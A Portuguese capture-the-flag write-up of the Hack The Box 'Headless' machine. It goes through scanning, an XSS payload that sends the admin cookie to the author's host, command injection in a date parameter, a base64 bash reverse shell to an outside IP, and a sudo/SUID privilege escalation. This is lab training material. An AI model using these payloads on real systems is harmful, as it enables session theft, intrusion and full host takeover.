---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Headless - Fácil
date: 2024-04-04 19:28:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, sudo, web, xss, rce, facil]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/headless/logo.png){: w="100" h="100" .left}

---
# **CTF - Headless**
---
---
## **Enumeração**

### nmap

```shell
─ ~/htb/headless                                                                                             ✔  1m 49s  ≡ 
╰─ sudo nmap -sV -Pn -sS --min-rate 10000 --stats-every=7s -p- -oA nmap 10.129.133.211
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-24 19:51 -03
Service scan Timing: About 100.00% done; ETC: 19:52 (0:00:00 remaining)
Nmap scan report for 10.129.133.211
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
5000/tcp open  upnp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=3/24%Time=6600AE67%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Sun,\x2024\x20Mar\x202024\x2022:51:19\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:02799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;
SF:\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construction
SF:</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20
SF:'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-c
SF:ontent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ali
SF:gn-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h
SF:eight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200,\
SF:x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE\x
SF:20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\
SF:x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respons
SF:e</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version
SF:\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20u
SF:nsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.70 seconds
```
{: .nolineno }  

Porta 5000

![alt text](/assets/img/headless/1.png)

```shell
ffuf

─ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.129.133.211:5000/FUZZ -e .php,.html -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.133.211:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 211ms]
support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 230ms]
:: Progress: [61428/61428] :: Job [1/1] :: 630 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
```
{: .nolineno }  

Ao testar xss no campo message:

`<script>prompt(1)</script>`

![alt text](/assets/img/headless/2.png)

Usando o payload `<img src=x onerror=fetch('http://10.10.14.135:80/'+document.cookie);>` no burp consegui pegar o cookie do admin, mas antes setei o web server python.

### Burp

```text
POST /support HTTP/1.1
Host: 10.129.133.211:5000
Content-Length: 71
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.133.211:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <img src=x onerror=fetch('http://10.10.14.135:80/'+document.cookie);>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.133.211:5000
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

fname=dan&lname=dan&email=dan%40dan.dan&phone=551115987789&message=xxxx
```
{: .nolineno }  

![alt text](/assets/img/headless/6.png)

Agora só colocar o cookie no navegador e acessa /dashboard

![alt text](/assets/img/headless/3.png)

Interceptei com burp o botão Generate Report

![alt text](/assets/img/headless/4.png)

Tentei um RCE básico e funcionou  
`date=;ping 10.10.14.135`  
Enviando um ping pra minha máquina e com tcpdump confirmando a execução do ping.

```text
POST /dashboard HTTP/1.1
Host: 10.129.133.211:5000
Content-Length: 23
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.133.211:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.133.211:5000/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Connection: close

date=;ping 10.10.14.135
```
{: .nolineno }  

![alt text](/assets/img/headless/5.png)

Mas pra conhecimento decide usar o ffuf pra descobrir os payload possíveis no parâmetros date.

Salvei o request do burp como `payload.req` e em date adicionei FUZZ.
`date=FUZZ`
Usei a wordlist `UnixAttacks.fuzzdb.txt`

```shell
─ ffuf -ic -c -of csv -request-proto http -request payload.req -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -fs 2028
```
{: .nolineno }  
Como a lista ficou grande resolvi não colocar aqui.  
Talvez essa não seja a wordlist correta pra isso.

## **Acesso/Foothold**

Usei esse payload em base64 pra obter reverse shell.

<https://n00br00t.github.io/sh/>  
`bash -i >& /dev/tcp/10.10.14.135/4443 0>&1`  

Ficando dessa forma no burp

`date=;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzUvNDQ0MyAwPiYx'|base64 -d|bash`

Selecionei tudo após o `date=`  
Botão direito > Convert selection/URL/URL Encode all....

![alt text](/assets/img/headless/7.png)
![alt text](/assets/img/headless/8.png)

### user flag

![alt text](/assets/img/headless/9.png)

```shell
dvir@headless:~$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~$ 

Script syscheck

╰─ cat syscheck 
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
{: .nolineno }  

## **Escalação de Privilégio**

Com sudo é possível executar o script /usr/bin/syscheck sem senha, esse script chama outro script `initdb.sh`.
Esse script `initdb.sh` não existe, vou criar e adicionar
`chmod u+s /bin/bash` para adicionar o SUID ao bash, após isso executar o syscheck com sudo e executar o bash -p pra ter root.  

`sudo /usr/bin/syscheck`  

![alt text](/assets/img/headless/10.png)

![alt text](/assets/img/headless/11.png)

